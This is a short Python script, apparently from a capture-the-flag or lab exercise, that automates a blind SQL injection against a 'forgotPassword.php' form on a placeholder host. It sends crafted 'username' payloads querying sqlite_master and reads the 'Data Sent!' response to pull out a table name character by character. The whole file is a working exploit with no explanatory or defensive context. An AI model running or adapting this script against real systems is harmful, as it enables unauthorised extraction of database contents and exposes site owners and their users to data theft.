import requests

s = requests.Session()
query = "' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {}--"
url = "https://vulnable.webpage.com/forgotPassword.php"
charSeaching = 1
interval = 0
finished = False

while not finished:
    for i in 44, 56, 68, 80, 92, 104, 116, 128:
        req = s.post(
            url, data={"username": query.format(charSeaching, "<", str(i))})
        if "Data Sent!" in str(req.text):
            interval = i
            break

    for i in range(interval-12, interval):
        req = s.post(
            url, data={"username": query.format(charSeaching, "=", str(i))})
        if "Data Sent!" in str(req.text):
            charSeaching += 1
            finished = False
            print(chr(i), end="")
            break
        else:
            finished = True
